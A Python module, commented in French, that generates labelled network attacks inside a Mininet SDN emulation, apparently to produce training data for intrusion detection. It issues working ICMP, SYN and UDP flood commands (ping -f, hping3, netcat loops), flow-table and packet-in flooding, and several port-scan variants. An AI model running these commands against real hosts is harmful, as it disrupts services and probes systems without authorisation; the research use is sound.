#!/usr/bin/env python3
"""
Generateur d'attaques reseau pour SDN
"""
import time
import random
import os
from datetime import datetime

LABEL_FILE = '/tmp/sdn_current_label.txt'


class AttackGenerator:
    """Generateur d'attaques pour Mininet"""
    
    def __init__(self, net, label_callback=None):
        self.net = net
        self.label_callback = label_callback
        self.attack_log = []
        
    def _log(self, attack_type, attacker, target, start, duration):
        self.attack_log.append({
            'type': attack_type, 'attacker': attacker, 
            'target': target, 'start_time': start, 'duration': duration
        })
        
    def _set_label(self, label):
        """Set label using multiple methods to ensure sync"""
        # Direct file write for reliability
        try:
            with open(LABEL_FILE, 'w') as f:
                f.write(label)
            os.chmod(LABEL_FILE, 0o666)
        except Exception as e:
            print(f"[WARNING] Label file write failed: {e}")
        
        # Also use callback if available
        if self.label_callback:
            self.label_callback(label)
        
        # Wait a bit to ensure monitoring picks up the new label
        time.sleep(1)
        print(f"   [LABEL SET] {label}")
    
    def _verify_label(self, expected):
        """Verify that label was properly set"""
        try:
            with open(LABEL_FILE, 'r') as f:
                current = f.read().strip()
                if current != expected:
                    print(f"[WARNING] Label mismatch: expected {expected}, got {current}")
                    return False
                return True
        except:
            return False
            
    # === DoS ===
    
    def icmp_flood(self, attacker='h5', target='10.0.0.1', duration=30):
        """ICMP Flood (ping flood)"""
        h = self.net.get(attacker)
        
        print(f"[ATTACK] ICMP Flood: {attacker} -> {target}")
        self._set_label('dos_icmp_flood')
        self._verify_label('dos_icmp_flood')
        
        start = datetime.now()
        
        # Aggressive ping flood - more packets to ensure detection
        h.cmd(f'timeout {duration} ping -f -c 10000 {target} > /tmp/icmp_flood.log 2>&1 &')
        # Also add some variation with regular pings from multiple sources
        h.cmd(f'for i in $(seq 1 {duration}); do ping -c 10 -i 0.1 {target} > /dev/null 2>&1 & sleep 1; done &')
        
        # Keep checking label during attack
        for i in range(duration):
            time.sleep(1)
            if i % 5 == 0:  # Re-affirm label every 5 seconds
                self._set_label('dos_icmp_flood')
        
        self._log('dos_icmp_flood', attacker, target, start, duration)
        
    def tcp_syn_flood(self, attacker='h5', target='10.0.0.2', port=80, duration=30):
        """TCP SYN Flood"""
        h = self.net.get(attacker)
        
        print(f"[ATTACK] TCP SYN Flood: {attacker} -> {target}:{port}")
        self._set_label('dos_tcp_syn_flood')
        self._verify_label('dos_tcp_syn_flood')
        
        start = datetime.now()
        
        # Try hping3 first, fallback to alternatives
        h.cmd(f'timeout {duration} hping3 -S -p {port} -i u1000 {target} > /tmp/syn_flood.log 2>&1 &')
        
        # Fallback: Multiple rapid connections with netcat
        for i in range(duration):
            h.cmd(f'for j in $(seq 1 50); do nc -w 1 {target} {port} 2>/dev/null & done')
            time.sleep(1)
            if i % 5 == 0:
                self._set_label('dos_tcp_syn_flood')
        
        self._log('dos_tcp_syn_flood', attacker, target, start, duration)
        
    def udp_flood(self, attacker='h5', target='10.0.0.2', port=53, duration=30):
        """UDP Flood"""
        h = self.net.get(attacker)
        
        print(f"[ATTACK] UDP Flood: {attacker} -> {target}:{port}")
        self._set_label('dos_udp_flood')
        self._verify_label('dos_udp_flood')
        
        start = datetime.now()
        
        h.cmd(f'timeout {duration} hping3 --udp -p {port} -i u1000 {target} > /tmp/udp_flood.log 2>&1 &')
        
        # Alternative with netcat, maintaining label throughout
        for i in range(duration):
            h.cmd(f'for j in $(seq 1 100); do echo "FLOOD" | nc -u -w0 {target} {port} 2>/dev/null & done')
            time.sleep(1)
            if i % 5 == 0:
                self._set_label('dos_udp_flood')
        
        self._log('dos_udp_flood', attacker, target, start, duration)
        
    # === Flow Table ===
    
    def flow_table_saturation(self, attacker='h5', subnet='10.0.0', num_flows=500, duration=60):
        """Saturation table de flux"""
        h = self.net.get(attacker)
        
        print(f"[ATTACK] Flow Table Saturation: {num_flows} flows")
        self._set_label('flow_table_saturation')
        self._verify_label('flow_table_saturation')
        
        start = datetime.now()
        
        ports = list(range(1, 65535))
        random.shuffle(ports)
        
        last_label_refresh = time.time()
        for i in range(num_flows):
            dst_ip = f"{subnet}.{(i % 254) + 1}"
            port = ports[i % len(ports)]
            
            if i % 3 == 0:
                h.cmd(f'ping -c 1 -W 1 {dst_ip} > /dev/null 2>&1 &')
            elif i % 3 == 1:
                h.cmd(f'nc -w 1 {dst_ip} {port} 2>/dev/null &')
            else:
                h.cmd(f'echo "" | nc -u -w0 {dst_ip} {port} 2>/dev/null &')
                
            if i % 50 == 0:
                time.sleep(0.1)
                
            # Re-affirm label every 5 seconds
            if time.time() - last_label_refresh >= 5:
                self._set_label('flow_table_saturation')
                last_label_refresh = time.time()
                
        self._log('flow_table_saturation', attacker, subnet, start, duration)
        
    # === Port Scan ===
    
    def port_scan_horizontal(self, attacker='h5', subnet='10.0.0', port=80, duration=30):
        """Scan horizontal: meme port, plusieurs hotes"""
        h = self.net.get(attacker)
        
        print(f"[ATTACK] Scan Horizontal: port {port}")
        self._set_label('scan_horizontal')
        self._verify_label('scan_horizontal')
        
        start = datetime.now()
        last_label_refresh = time.time()
        
        for i in range(1, 255):
            h.cmd(f'nc -z -w 1 {subnet}.{i} {port} > /dev/null 2>&1 &')
            time.sleep(duration / 254)
            
            if time.time() - last_label_refresh >= 5:
                self._set_label('scan_horizontal')
                last_label_refresh = time.time()
            
        self._log('scan_horizontal', attacker, subnet, start, duration)
        
    def port_scan_vertical(self, attacker='h5', target='10.0.0.2', port_start=1, port_end=1024, duration=30):
        """Scan vertical: un hote, plusieurs ports"""
        h = self.net.get(attacker)
        
        print(f"[ATTACK] Scan Vertical: {target} ports {port_start}-{port_end}")
        self._set_label('scan_vertical')
        self._verify_label('scan_vertical')
        
        start = datetime.now()
        
        num_ports = port_end - port_start + 1
        delay = duration / num_ports
        last_label_refresh = time.time()
        
        for port in range(port_start, port_end + 1):
            h.cmd(f'nc -z -w 1 {target} {port} > /dev/null 2>&1 &')
            if delay >= 0.01:
                time.sleep(delay)
            
            if time.time() - last_label_refresh >= 5:
                self._set_label('scan_vertical')
                last_label_refresh = time.time()
                
        self._log('scan_vertical', attacker, target, start, duration)
        
    def port_scan_stealth(self, attacker='h5', target='10.0.0.2', duration=60):
        """Scan furtif avec delais aleatoires"""
        h = self.net.get(attacker)
        
        print(f"[ATTACK] Scan Stealth: {target}")
        self._set_label('scan_stealth')
        self._verify_label('scan_stealth')
        
        start = datetime.now()
        
        ports_communs = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 
                         993, 995, 1433, 3306, 3389, 5432, 8080]
        
        end_time = time.time() + duration
        last_label_refresh = time.time()
        while time.time() < end_time:
            port = random.choice(ports_communs)
            h.cmd(f'nc -z -w 1 {target} {port} > /dev/null 2>&1 &')
            time.sleep(random.uniform(0.5, 3.0))
            
            if time.time() - last_label_refresh >= 5:
                self._set_label('scan_stealth')
                last_label_refresh = time.time()
            
        self._log('scan_stealth', attacker, target, start, duration)
        
    # === OpenFlow ===
    
    def packet_in_overflow(self, attacker='h5', duration=30):
        """Surcharge Packet-In vers le controleur"""
        h = self.net.get(attacker)
        
        print(f"[ATTACK] Packet-In Overflow")
        self._set_label('openflow_packet_in_overflow')
        self._verify_label('openflow_packet_in_overflow')
        
        start = datetime.now()
        
        end_time = time.time() + duration
        last_label_refresh = time.time()
        while time.time() < end_time:
            for _ in range(100):
                ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
                h.cmd(f'ping -c 1 -W 1 {ip} > /dev/null 2>&1 &')
            time.sleep(0.5)
            
            if time.time() - last_label_refresh >= 5:
                self._set_label('openflow_packet_in_overflow')
                last_label_refresh = time.time()
            
        self._log('openflow_packet_in_overflow', attacker, 'controller', start, duration)
        
    # === Utils ===
    
    def get_attack_log(self):
        return self.attack_log
        
    def run_all(self, duration=20, pause=10):
        """Execute toutes les attaques"""
        attaques = [
            ('ICMP Flood', lambda: self.icmp_flood(duration=duration)),
            ('TCP SYN Flood', lambda: self.tcp_syn_flood(duration=duration)),
            ('UDP Flood', lambda: self.udp_flood(duration=duration)),
            ('Flow Table', lambda: self.flow_table_saturation(num_flows=300, duration=duration)),
            ('Scan H', lambda: self.port_scan_horizontal(duration=duration)),
            ('Scan V', lambda: self.port_scan_vertical(duration=duration)),
            ('Scan Stealth', lambda: self.port_scan_stealth(duration=duration)),
            ('Packet-In', lambda: self.packet_in_overflow(duration=duration)),
        ]
        
        for nom, func in attaques:
            print(f"\n=== {nom} ===")
            func()
            print(f"[PAUSE] {pause}s")
            self._set_label('normal')
            time.sleep(pause)


if __name__ == '__main__':
    print("Ce module doit etre importe avec une instance Mininet")
